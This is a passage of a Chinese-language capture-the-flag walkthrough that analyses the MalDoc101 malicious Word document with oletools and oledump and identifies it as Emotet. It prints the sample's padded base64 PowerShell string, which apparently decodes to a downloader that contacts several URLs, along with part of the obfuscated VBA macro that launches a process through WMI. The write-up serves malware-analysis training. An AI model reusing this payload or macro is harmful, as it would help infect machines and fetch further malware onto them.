s7712ffvs626fqoAdgBm2342772g3&\*gs7712ffvs626fqAF8AaA2342772g3&\*gs7712ffvs626fqA2AHYA2342772g3&\*gs7712ffvs626fqMgBpAH2342772g3&\*gs7712ffvs626fqgALwAq2342772g3&\*gs7712ffvs626fqAGgAdA2342772g3&\*gs7712ffvs626fqB0AHAA2342772g3&\*gs7712ffvs626fqOgAvAC2342772g3&\*gs7712ffvs626fq8AaABv2342772g3&\*gs7712ffvs626fqAGwAZg2342772g3&\*gs7712ffvs626fqB2AGUA2342772g3&\*gs7712ffvs626fqLgBzAG2342772g3&\*gs7712ffvs626fqUALwBp2342772g3&\*gs7712ffvs626fqAG0AYQ2342772g3&\*gs7712ffvs626fqBnAGUA2342772g3&\*gs7712ffvs626fqcwAvAD2342772g3&\*gs7712ffvs626fqEAYwBr2342772g3&\*gs7712ffvs626fqAHcANQ2342772g3&\*gs7712ffvs626fqBtAGoA2342772g3&\*gs7712ffvs626fqNAA5AH2342772g3&\*gs7712ffvs626fqcAXwAy2342772g3&\*gs7712ffvs626fqAGsAMQ2342772g3&\*gs7712ffvs626fqAxAHAA2342772g3&\*gs7712ffvs626fqeABfAG2342772g3&\*gs7712ffvs626fqQALwAq2342772g3&\*gs7712ffvs626fqAGgAdA2342772g3&\*gs7712ffvs626fqB0AHAA2342772g3&\*gs7712ffvs626fqOgAvAC2342772g3&\*gs7712ffvs626fq8AdwB32342772g3&\*gs7712ffvs626fqAHcALg2342772g3&\*gs7712ffvs626fqBjAGYA2342772g3&\*gs7712ffvs626fqbQAuAG2342772g3&\*gs7712ffvs626fq4AbAAv2342772g3&\*gs7712ffvs626fqAF8AYg2342772g3&\*gs7712ffvs626fqBhAGMA2342772g3&\*gs7712ffvs626fqawB1AH2342772g3&\*gs7712ffvs626fqAALwB52342772g3&\*gs7712ffvs626fqAGYAaA2342772g3&\*gs7712ffvs626fqByAG0A2342772g3&\*gs7712ffvs626fqaAA2AH2342772g3&\*gs7712ffvs626fqUAMABo2342772g3&\*gs7712ffvs626fqAGUAaQ2342772g3&\*gs7712ffvs626fqBkAG4A2342772g3&\*gs7712ffvs626fqdwByAH2342772g3&\*gs7712ffvs626fqUAdwBo2342772g3&\*gs7712ffvs626fqAGEAMg2342772g3&\*gs7712ffvs626fqB0ADQA2342772g3&\*gs7712ffvs626fqbQBqAH2342772g3&\*gs7712ffvs626fqoANgBw2342772g3&\*gs7712ffvs626fqAF8AeQ2342772g3&\*gs7712ffvs626fqB4AGgA2342772g3&\*gs7712ffvs626fqeQB1AD2342772g3&\*gs7712ffvs626fqMAOQAw2342772g3&\*gs7712ffvs626fqAGkANg2342772g3&\*gs7712ffvs626fqBfAHEA2342772g3&\*gs7712ffvs626fqOQAzAG2342772g3&\*gs7712ffvs626fqgAawBo2342772g3&\*gs7712ffvs626fqADMAZA2342772g3&\*gs7712ffvs626fqBkAG0A2342772g3&\*gs7712ffvs626fqLwAnAC2342772g3&\*gs7712ffvs626fq4AIgBz2342772g3&\*gs7712ffvs626fqAGAAUA2342772g3&\*gs7712ffvs626fqBsAGkA2342772g3&\*gs7712ffvs626fqVAAiAC2342772g3&\*gs7712ffvs626fqgAWwBj2342772g3&\*gs7712ffvs626fqAGgAYQ2342772g3&\*gs7712ffvs626fqByAF0A2342772g3&\*gs7712ffvs626fqNAAyAC2342772g3&\*gs7712ffvs626fqkAOwAk2342772g3&\*gs7712ffvs626fqAHMAZQ2342772g3&\*gs7712ffvs626fqBjAGMA2342772g3&\*gs7712ffvs626fqaQBlAH2342772g3&\*gs7712ffvs626fqIAZABl2342772g3&\*gs7712ffvs626fqAGUAdA2342772g3&\*gs7712ffvs626fqBoAD0A2342772g3&\*gs7712ffvs626fqJwBkAH2342772g3&\*gs7712ffvs626fqUAdQB62342772g3&\*gs7712ffvs626fqAHkAZQ2342772g3&\*gs7712ffvs626fqBhAHcA2342772g3&\*gs7712ffvs626fqcAB1AG2342772g3&\*gs7712ffvs626fqEAcQB12342772g3&\*gs7712ffvs626fqACcAOw2342772g3&\*gs7712ffvs626fqBmAG8A2342772g3&\*gs7712ffvs626fqcgBlAG2342772g3&\*gs7712ffvs626fqEAYwBo2342772g3&\*gs7712ffvs626fqACgAJA2342772g3&\*gs7712ffvs626fqBnAGUA2342772g3&\*gs7712ffvs626fqZQByAH2342772g3&\*gs7712ffvs626fqMAaQBl2342772g3&\*gs7712ffvs626fqAGIAIA2342772g3&\*gs7712ffvs626fqBpAG4A2342772g3&\*gs7712ffvs626fqIAAkAG2342772g3&\*gs7712ffvs626fqoAYQBj2342772g3&\*gs7712ffvs626fqAGwAZQ2342772g3&\*gs7712ffvs626fqBlAHcA2342772g3&\*gs7712ffvs626fqeQBpAH2342772g3&\*gs7712ffvs626fqEAdQAp2342772g3&\*gs7712ffvs626fqAHsAdA2342772g3&\*gs7712ffvs626fqByAHkA2342772g3&\*gs7712ffvs626fqewAkAH2342772g3&\*gs7712ffvs626fqIAZQB12342772g3&\*gs7712ffvs626fqAHMAdA2342772g3&\*gs7712ffvs626fqBoAG8A2342772g3&\*gs7712ffvs626fqYQBzAC2342772g3&\*gs7712ffvs626fq4AIgBk2342772g3&\*gs7712ffvs626fqAE8AVw2342772g3&\*gs7712ffvs626fqBOAGAA2342772g3&\*gs7712ffvs626fqbABvAE2342772g3&\*gs7712ffvs626fqEAYABk2342772g3&\*gs7712ffvs626fqAGYAaQ2342772g3&\*gs7712ffvs626fqBgAEwA2342772g3&\*gs7712ffvs626fqZQAiAC2342772g3&\*gs7712ffvs626fqgAJABn2342772g3&\*gs7712ffvs626fqAGUAZQ2342772g3&\*gs7712ffvs626fqByAHMA2342772g3&\*gs7712ffvs626fqaQBlAG2342772g3&\*gs7712ffvs626fqIALAAg2342772g3&\*gs7712ffvs626fqACQAdA2342772g3&\*gs7712ffvs626fqBvAGUA2342772g3&\*gs7712ffvs626fqaABmAG2342772g3&\*gs7712ffvs626fqUAdABo2342772g3&\*gs7712ffvs626fqAHgAbw2342772g3&\*gs7712ffvs626fqBoAGIA2342772g3&\*gs7712ffvs626fqYQBlAH2342772g3&\*gs7712ffvs626fqkAKQA72342772g3&\*gs7712ffvs626fqACQAYg2342772g3&\*gs7712ffvs626fqB1AGgA2342772g3&\*gs7712ffvs626fqeABlAH2342772g3&\*gs7712ffvs626fqUAaAA92342772g3&\*gs7712ffvs626fqACcAZA2342772g3&\*gs7712ffvs626fqBvAGUA2342772g3&\*gs7712ffvs626fqeQBkAG2342772g3&\*gs7712ffvs626fqUAaQBk2342772g3&\*gs7712ffvs626fqAHEAdQ2342772g3&\*gs7712ffvs626fqBhAGkA2342772g3&\*gs7712ffvs626fqagBsAG2342772g3&\*gs7712ffvs626fqUAdQBj2342772g3&\*gs7712ffvs626fqACcAOw2342772g3&\*gs7712ffvs626fqBJAGYA2342772g3&\*gs7712ffvs626fqIAAoAC2342772g3&\*gs7712ffvs626fqgALgAo2342772g3&\*gs7712ffvs626fqACcARw2342772g3&\*gs7712ffvs626fqBlAHQA2342772g3&\*gs7712ffvs626fqLQAnAC2342772g3&\*gs7712ffvs626fqsAJwBJ2342772g3&\*gs7712ffvs626fqAHQAZQ2342772g3&\*gs7712ffvs626fqAnACsA2342772g3&\*gs7712ffvs626fqJwBtAC2342772g3&\*gs7712ffvs626fqcAKQAg2342772g3&\*gs7712ffvs626fqACQAdA2342772g3&\*gs7712ffvs626fqBvAGUA2342772g3&\*gs7712ffvs626fqaABmAG2342772g3&\*gs7712ffvs626fqUAdABo2342772g3&\*gs7712ffvs626fqAHgAbw2342772g3&\*gs7712ffvs626fqBoAGIA2342772g3&\*gs7712ffvs626fqYQBlAH2342772g3&\*gs7712ffvs626fqkAKQAu2342772g3&\*gs7712ffvs626fqACIAbA2342772g3&\*gs7712ffvs626fqBgAGUA2342772g3&\*gs7712ffvs626fqTgBHAF2342772g3&\*gs7712ffvs626fqQASAAi2342772g3&\*gs7712ffvs626fqACAALQ2342772g3&\*gs7712ffvs626fqBnAGUA2342772g3&\*gs7712ffvs626fqIAAyAD2342772g3&\*gs7712ffvs626fqQANwA12342772g3&\*gs7712ffvs626fqADEAKQ2342772g3&\*gs7712ffvs626fqAgAHsA2342772g3&\*gs7712ffvs626fqKABbAH2342772g3&\*gs7712ffvs626fqcAbQBp2342772g3&\*gs7712ffvs626fqAGMAbA2342772g3&\*gs7712ffvs626fqBhAHMA2342772g3&\*gs7712ffvs626fqcwBdAC2342772g3&\*gs7712ffvs626fqcAdwBp2342772g3&\*gs7712ffvs626fqAG4AMw2342772g3&\*gs7712ffvs626fqAyAF8A2342772g3&\*gs7712ffvs626fqUAByAG2342772g3&\*gs7712ffvs626fq8AYwBl2342772g3&\*gs7712ffvs626fqAHMAcw2342772g3&\*gs7712ffvs626fqAnACkA2342772g3&\*gs7712ffvs626fqLgAiAE2342772g3&\*gs7712ffvs626fqMAYABS2342772g3&\*gs7712ffvs626fqAGUAYQ2342772g3&\*gs7712ffvs626fqBUAGUA2342772g3&\*gs7712ffvs626fqIgAoAC2342772g3&\*gs7712ffvs626fqQAdABv2342772g3&\*gs7712ffvs626fqAGUAaA2342772g3&\*gs7712ffvs626fqBmAGUA2342772g3&\*gs7712ffvs626fqdABoAH2342772g3&\*gs7712ffvs626fqgAbwBo2342772g3&\*gs7712ffvs626fqAGIAYQ2342772g3&\*gs7712ffvs626fqBlAHkA2342772g3&\*gs7712ffvs626fqKQA7AC2342772g3&\*gs7712ffvs626fqQAcQB12342772g3&\*gs7712ffvs626fqAG8Abw2342772g3&\*gs7712ffvs626fqBkAHQA2342772g3&\*gs7712ffvs626fqZQBlAG2342772g3&\*gs7712ffvs626fqgAPQAn2342772g3&\*gs7712ffvs626fqAGoAaQ2342772g3&\*gs7712ffvs626fqBhAGYA2342772g3&\*gs7712ffvs626fqcgB1AH2342772g3&\*gs7712ffvs626fqUAegBs2342772g3&\*gs7712ffvs626fqAGEAbw2342772g3&\*gs7712ffvs626fqBsAHQA2342772g3&\*gs7712ffvs626fqaABvAG2342772g3&\*gs7712ffvs626fqkAYwAn2342772g3&\*gs7712ffvs626fqADsAYg2342772g3&\*gs7712ffvs626fqByAGUA2342772g3&\*gs7712ffvs626fqYQBrAD2342772g3&\*gs7712ffvs626fqsAJABj2342772g3&\*gs7712ffvs626fqAGgAaQ2342772g3&\*gs7712ffvs626fqBnAGMA2342772g3&\*gs7712ffvs626fqaABpAG2342772g3&\*gs7712ffvs626fqUAbgB02342772g3&\*gs7712ffvs626fqAGUAaQ2342772g3&\*gs7712ffvs626fqBxAHUA2342772g3&\*gs7712ffvs626fqPQAnAH2342772g3&\*gs7712ffvs626fqkAbwBv2342772g3&\*gs7712ffvs626fqAHcAdg2342772g3&\*gs7712ffvs626fqBlAGkA2342772g3&\*gs7712ffvs626fqaABuAG2342772g3&\*gs7712ffvs626fqkAZQBq2342772g3&\*gs7712ffvs626fqACcAfQ2342772g3&\*gs7712ffvs626fqB9AGMA2342772g3&\*gs7712ffvs626fqYQB0AG2342772g3&\*gs7712ffvs626fqMAaAB72342772g3&\*gs7712ffvs626fqAH0AfQ2342772g3&\*gs7712ffvs626fqAkAHQA2342772g3&\*gs7712ffvs626fqbwBpAH2342772g3&\*gs7712ffvs626fqoAbAB12342772g3&\*gs7712ffvs626fqAHUAbA2342772g3&\*gs7712ffvs626fqBmAGkA2342772g3&\*gs7712ffvs626fqZQByAD2342772g3&\*gs7712ffvs626fq0AJwBm2342772g3&\*gs7712ffvs626fqAG8AcQ2342772g3&\*gs7712ffvs626fqB1AGwA2342772g3&\*gs7712ffvs626fqZQB2AG2342772g3&\*gs7712ffvs626fqMAYQBv2342772g3&\*gs7712ffvs626fqAGoAJw2342772g3&\*gs7712ffvs626fqA=
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+�Tab3
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+�Tab4
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'meetcuac'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'joopxof'
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'dechxoz'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'caorfauxleir'
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'joefwoefcheaw'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'P'
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'teehkaifxoodthiv'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'foewdaibzian'
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'paerwagyouqumeid'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'taowseuvjeip'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'kaizseah'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'gegheyhes'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'yoewcheuypouc'
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'gaoddaicsauktheb'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'vuazleelxeep'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'duuhfeupniwboh'
+\-------------------------------------------------------------------------------
+VBA FORM Variable "None" IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'Page1'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+\-------------------------------------------------------------------------------
+VBA FORM Variable "b'Page2'" IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document\_open       |Runs when the Word or Publisher document is  |
+\|          |                    |opened                                       |
+|Suspicious|Create              |May execute file or a system command through |
+\|          |                    |WMI                                          |
+|Suspicious|showwindow          |May hide the application                     |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+\|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+\|          |                    |used to obfuscate strings (option --decode to|
+\|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+\|          |                    |used to obfuscate strings (option --decode to|
+\|          |                    |see all)                                     |
+|Hex String|2#Bw                |32234277                                     |
+|Hex String|J#Bw                |4A234277                                     |
+|Hex String|#Bw                 |0A234277                                     |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+\|          |                    |code and P-code are different, this may have |
+\|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at [https://github.com/decalage2/oletools/issues](https://github.com/decalage2/oletools/issues)
+```
+
+​	我们要主要到这里：
+
+![image-20260821153022664](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821153022664.png)
+
+​	这里有一个表格样式的东西，该**`Document_open`**事件（也就是Q2的回答）是一个 VBA 触发器，会在文档打开时自动执行。攻击者通常会利用此功能，在受害者打开文档后立即启动恶意代码。通过利用此事件，恶意宏无需用户执行任何手动操作（例如单击按钮），使其成为一种有效的初始攻击途径。（这个可以，我喜欢，可以试试搞进去我的题目去）
+
+​	此外，分析结果还突出显示了其他可疑活动，例如使用命令创建对象、操纵字符串或解码 Base64 编码的数据。这些都是 VBA 宏中恶意行为的常见特征。
+
+​	对于第三问，要进行哈希值的查看，我这边直接就：
+
+​	`Get-FileHash .\sample.bin -Algorithm SHA256`
+
+​	然后就：
+
+![image-20260821153837460](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821153837460.png)
+
+​	然后使用该哈希值查询威胁情报平台（例如`VirusTotal`），以收集有关文件信誉和潜在威胁的信息。
+
+​	![image-20260821154150555](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821154150555.png)
+
+​	（还蛮好用）
+
+​	可以通过这个平台查完哈希之后知道这不是什么好东西反正：
+
+![image-20260821154349735](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821154349735.png)
+
+​	这里有一个popular threat label后面展示了Q3想问的那种恶意软件家族，这个家族就是emotet。
+
+​	Q4这里问哪个是负责储存base64的流，这里我们还是要找上面那个我们那个很长很长的分析结果出来：
+
+​	![image-20260821161924034](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821161924034.png)
+
+​	这个东西是不是很大啊，203G，内存很大这表明它可能包含混淆或编码的内容。那我们就针对这个进行细找：
+
+![image-20260821162552316](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821162552316.png)
+
+​	这里的特殊数据流是很长一串的类base64编码数据。这种编码格式是混淆的有力标志，攻击者经常使用混淆来隐藏其有效载荷或命令。Base64 字符串通常隐藏恶意脚本、URL 或其他敏感指令，必须对其进行解码才能了解恶意软件的意图。
+
+![image-20260821162142301](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821162142301.png)
+
+​	识别出该数据流后，下一步是确定与该数据流关联的数据流编号。`oledump`该数据流的编号为`34`：
+
+​	Q5这里问我们文件中的一个窗体名称
+
+​	为了确定文档是否包含用户窗体并识别其名称，我们首先需要了解用户窗体的概念及其作用。在 Microsoft Office 文档中，用户窗体`user-form`是嵌入在 VBA 宏中的图形界面。它提供了一种与用户交互、收集输入或执行特定功能的方式。恶意攻击者经常利用用户窗体来执行隐藏代码、欺骗用户或传播恶意载荷。
+
+​	这里的话我们还是用上这个oledump.py，前面也用过，直接回翻就好，这里重点找：
+
+​	`Macros/VBA/`
+
+​	下面的对象。
+
+```	
+  8:     12997 'Macros/VBA/_VBA_PROJECT'
+  9:      2112 'Macros/VBA/__SRP_0'
+ 10:       190 'Macros/VBA/__SRP_1'
+ 11:       532 'Macros/VBA/__SRP_2'
+ 12:       156 'Macros/VBA/__SRP_3'
+ 13: M    1367 'Macros/VBA/diakzouxchouz'
+ 14:       908 'Macros/VBA/dir'
+ 15: M    5705 'Macros/VBA/govwiahtoozfaid'
+ 16: m    1187 'Macros/VBA/roubhaol'
+```
+
+​	前面我们也提取过了一次txt文件，我们直接在那个txt找就行：
+
+![image-20260821164513392](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821164513392.png)
+
+​	这个.frm文件呢，通常以`.frm`文件的形式存储在 VBA 项目中。这些`.frm`文件定义了用户窗体的布局和功能，包括与其关联的任何属性或事件处理程序。
+
+​	所以就是肉包了（roubhaol）
+
+​	Q6的话就是问我们： 此文档包含一个经过混淆处理的 base64 编码字符串；用于填充（或混淆）此字符串的值是什么？
+
+​	相信胆大心细的同志们在当时把这个bin文件分析完之后看见那个好长的base64吧，但是，我们细看的话，其实重复着些什么：
+
+![image-20260821164748262](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821164748262.png)
+
+​	这表明了这里存在混淆的操作，中间反复出现的是：`2342772g3&*gs7712ffvs626fq`，但是你细看的话你能看见一个玩意，就是这里每次重复的时候中间总是穿插一些个什么。。。我知道这个很难理解，那我直接把这些替换成逗号应该都能看得懂了：
+
+```
+�p，o，w，e，r，s，h，eL，L， ，-，e， JABsAG，kAZQBj，AGgAcg，BvAHUA，aAB3AH，UAdwA9，ACcAdg，B1AGEA，YwBkAG，8AdQB2，AGMAaQ，BvAHgA，aABhAG，8AbAAn，ADsAWw，BOAGUA，dAAuAF，MAZQBy，AHYAaQ，BjAGUA，UABvAG，kAbgB0，AE0AYQ，BuAGEA，ZwBlAH，IAXQA6，ADoAIg，BTAEUA，YABjAH，UAUgBp，AFQAeQ，BgAFAA，UgBPAG，AAVABv，AEMAYA，BvAGwA，IgAgAD，0AIAAn，AHQAbA，BzADEA，MgAsAC，AAdABs，AHMAMQ，AxACwA，IAB0AG，wAcwAn，ADsAJA，BkAGUA，aQBjAG，gAYgBl，AHUAZA，ByAGUA，aQByAC，AAPQAg，ACcAMw，AzADcA，JwA7AC，QAcQB1，AG8AYQ，BkAGcA，bwBpAG，oAdgBl，AHUAbQ，A9ACcA，ZAB1AH，UAdgBt，AG8AZQ，B6AGgA，YQBpAH，QAZwBv，AGgAJw，A7ACQA，dABvAG，UAaABm，AGUAdA，BoAHgA，bwBoAG，IAYQBl，AHkAPQ，AkAGUA，bgB2AD，oAdQBz，AGUAcg，BwAHIA，bwBmAG，kAbABl，ACsAJw，BcACcA，KwAkAG，QAZQBp，AGMAaA，BiAGUA，dQBkAH，IAZQBp，AHIAKw，AnAC4A，ZQB4AG，UAJwA7，ACQAcw，BpAGUA，bgB0AG，UAZQBk，AD0AJw，BxAHUA，YQBpAG，4AcQB1，AGEAYw，BoAGwA，bwBhAH，oAJwA7，ACQAcg，BlAHUA，cwB0AG，gAbwBh，AHMAPQ，AuACgA，JwBuAC，cAKwAn，AGUAdw，AtAG8A，YgAnAC，sAJwBq，AGUAYw，B0ACcA，KQAgAG，4ARQB0，AC4Adw，BlAEIA，YwBsAE，kAZQBu，AFQAOw，AkAGoA，YQBjAG，wAZQBl，AHcAeQ，BpAHEA，dQA9AC，cAaAB0，AHQAcA，BzADoA，LwAvAG，gAYQBv，AHEAdQ，BuAGsA，bwBuAG，cALgBj，AG8AbQ，AvAGIA，bgAvAH，MAOQB3，ADQAdA，BnAGMA，agBsAF，8AZgA2，ADYANg，A5AHUA，ZwB1AF，8AdwA0，AGIAag，AvACoA，aAB0AH，QAcABz，ADoALw，AvAHcA，dwB3AC，4AdABl，AGMAaA，B0AHIA，YQB2AG，UAbAAu，AGUAdg，BlAG4A，dABzAC，8AaQBu，AGYAbw，ByAG0A，YQB0AG，kAbwBu，AGwALw，A4AGwA，cwBqAG，gAcgBs，ADYAbg，BuAGsA，dwBnAH，kAegBz，AHUAZA，B6AGEA，bQBfAG，gAMwB3，AG4AZw，BfAGEA，NgB2AD，UALwAq，AGgAdA，B0AHAA，OgAvAC，8AZABp，AGcAaQ，B3AGUA，YgBtAG，EAcgBr，AGUAdA，BpAG4A，ZwAuAG，MAbwBt，AC8Adw，BwAC0A，YQBkAG，0AaQBu，AC8ANw，AyAHQA，MABqAG，oAaABt，AHYANw，B0AGEA，awB3AH，YAaQBz，AGYAbg，B6AF8A，ZQBlAG，oAdgBm，AF8AaA，A2AHYA，MgBpAH，gALwAq，AGgAdA，B0AHAA，OgAvAC，8AaABv，AGwAZg，B2AGUA，LgBzAG，UALwBp，AG0AYQ，BnAGUA，cwAvAD，EAYwBr，AHcANQ，BtAGoA，NAA5AH，cAXwAy，AGsAMQ，AxAHAA，eABfAG，QALwAq，AGgAdA，B0AHAA，OgAvAC，8AdwB3，AHcALg，BjAGYA，bQAuAG，4AbAAv，AF8AYg，BhAGMA，awB1AH，AALwB5，AGYAaA，ByAG0A，aAA2AH，UAMABo，AGUAaQ，BkAG4A，dwByAH，UAdwBo，AGEAMg，B0ADQA，bQBqAH，oANgBw，AF8AeQ，B4AGgA，eQB1AD，MAOQAw，AGkANg，BfAHEA，OQAzAG，gAawBo，ADMAZA，BkAG0A，LwAnAC，4AIgBz，AGAAUA，BsAGkA，VAAiAC，gAWwBj，AGgAYQ，ByAF0A，NAAyAC，kAOwAk，AHMAZQ，BjAGMA，aQBlAH，IAZABl，AGUAdA，BoAD0A，JwBkAH，UAdQB6，AHkAZQ，BhAHcA，cAB1AG，EAcQB1，ACcAOw，BmAG8A，cgBlAG，EAYwBo，ACgAJA，BnAGUA，ZQByAH，MAaQBl，AGIAIA，BpAG4A，IAAkAG，oAYQBj，AGwAZQ，BlAHcA，eQBpAH，EAdQAp，AHsAdA，ByAHkA，ewAkAH，IAZQB1，AHMAdA，BoAG8A，YQBzAC，4AIgBk，AE8AVw，BOAGAA，bABvAE，EAYABk，AGYAaQ，BgAEwA，ZQAiAC，gAJABn，AGUAZQ，ByAHMA，aQBlAG，IALAAg，ACQAdA，BvAGUA，aABmAG，UAdABo，AHgAbw，BoAGIA，YQBlAH，kAKQA7，ACQAYg，B1AGgA，eABlAH，UAaAA9，ACcAZA，BvAGUA，eQBkAG，UAaQBk，AHEAdQ，BhAGkA，agBsAG，UAdQBj，ACcAOw，BJAGYA，IAAoAC，gALgAo，ACcARw，BlAHQA，LQAnAC，sAJwBJ，AHQAZQ，AnACsA，JwBtAC，cAKQAg，ACQAdA，BvAGUA，aABmAG，UAdABo，AHgAbw，BoAGIA，YQBlAH，kAKQAu，ACIAbA，BgAGUA，TgBHAF，QASAAi，ACAALQ，BnAGUA，IAAyAD，QANwA1，ADEAKQ，AgAHsA，KABbAH，cAbQBp，AGMAbA，BhAHMA，cwBdAC，cAdwBp，AG4AMw，AyAF8A，UAByAG，8AYwBl，AHMAcw，AnACkA，LgAiAE，MAYABS，AGUAYQ，BUAGUA，IgAoAC，QAdABv，AGUAaA，BmAGUA，dABoAH，gAbwBo，AGIAYQ，BlAHkA，KQA7AC，QAcQB1，AG8Abw，BkAHQA，ZQBlAG，gAPQAn，AGoAaQ，BhAGYA，cgB1AH，UAegBs，AGEAbw，BsAHQA，aABvAG，kAYwAn，ADsAYg，ByAGUA，YQBrAD，sAJABj，AGgAaQ，BnAGMA，aABpAG，UAbgB0，AGUAaQ，BxAHUA，PQAnAH，kAbwBv，AHcAdg，BlAGkA，aABuAG，kAZQBq，ACcAfQ，B9AGMA，YQB0AG，MAaAB7，AH0AfQ，AkAHQA，bwBpAH，oAbAB1，AHUAbA，BmAGkA，ZQByAD，0AJwBm，AG8AcQ，B1AGwA，ZQB2AG，MAYQBv，AGoAJw，A=
+```
+
+​	如此美的Base64(又学到一个混淆小知识~)
+
+​	所以接下来我尝试提取其中损坏或异常的 VBA 宏代码。
+
+```
+PS D:\programCTF\malware\51-maldoc101\temp_extract_dir\MalDoc101> python3 oledump.py -s 15 --vbadecompresscorrupt sample.bin
+Attribute VB_Name = "govwiahtoozfaid"
+Function boaxvoebxiotqueb()
+gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
+Dim c7�ATOQe2�j As Integer
+c7�ATOQe2�j = 6
+Do While c7�ATOQe2�j < 6 + 2
+c7�ATOQe2�j = c7�ATOQe2�j + 5: DoEvents
+Loop
+haothkoebtheil = "2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fqw2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fqin2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fqm2342772g3&*gs7712ffvs626fqgm2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fqt2342772g3&*gs7712ffvs626fq" + gooykadheoj + "2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fq:w2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fqin2342772g3&*gs7712ffvs626fq322342772g3&*gs7712ffvs626fq_2342772g3&*gs7712ffvs626fq" + roubhaol.joefwoefcheaw + "2342772g3&*gs7712ffvs626fqr2342772g3&*gs7712ffvs626fqo2342772g3&*gs7712ffvs626fq2342772g3&*gs7712ffvs626fqc2342772g3&*gs7712ffvs626fqes2342772g3&*gs7712ffvs626fqs2342772g3&*gs7712ffvs626fq"
+Dim t0�7�VhC As String
+t0�7�VhC = Replace$("NrsGblssw", "NrsGbl", "jeSyf")
+deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
+Dim aboKTWBmOV As Variant
+Set tiajriokchaoy = CreateObject(deulsaocthuul)
+Dim Li2�J8�fUTJJ As Boolean
+deaknaugthein = roubhaol.kaizseah.ControlTipText
+Dim Wmuaj As String
+Wmuaj = Replace$("LqdFaWZRoPXoybkSqY", "LqdFaWZRoP", "nIEI6�")
+giakfeiw = deulsaocthuul + gooykadheoj + roubhaol.paerwagyouqumeid.ControlTipText + deaknaugthein
+Dim lgiLh7� As Object
+queegthaen = giakfeiw + roubhaol.joefwoefcheaw
+Dim FZV4�KPQ As Integer
+FZV4�KPQ = 4
+Do While FZV4�KPQ < 4 + 5
+FZV4�KPQ = FZV4�KPQ + 3: DoEvents
+Loop
+Set deavjoajsear = luumlaud(queegthaen)
+Dim kRpYwyW As String
